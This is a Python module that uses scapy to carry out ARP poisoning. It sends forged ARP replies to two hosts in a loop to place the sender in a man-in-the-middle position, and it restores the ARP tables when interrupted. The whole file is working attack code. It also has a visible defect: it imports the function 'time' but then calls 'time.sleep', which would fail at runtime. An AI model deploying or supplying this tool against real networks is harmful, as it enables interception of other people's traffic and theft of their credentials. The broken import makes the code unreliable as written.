"""This package contains everything related to ARP poisoning"""
from scapy.all import Ether, ARP, send, srp
from .general import get_target_mac
from time import time

def poison(target_ip, spoof_ip):
    # Get target host ip address using previously created function
    target_mac = get_target_mac(target_ip)
    # Create ARP packet. target_ip - target host ip address, spoof_ip - gateway ip address
    # op=2 means that ARP is going to send answer 
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send previously created packet without output
    send(packet, verbose=False)


# Get target mac address using ip address
def get_mac(target_ip):
    arp_request = ARP(pdst=target_ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    return answered_list[0][1].hwsrc

# Restore mac address in arp table
def restore_arp(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def mim(ip_1, ip_2):
    sent_packets_count = 0
    try:
        while True:
            poison(ip_1, ip_2)
            poison(ip_2, ip_1)
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nInterupted, Reseting ARP tables. Please wait")
        restore_arp(ip_1, ip_2)
        restore_arp(ip_2, ip_1)
        print("\nARP table restored.")
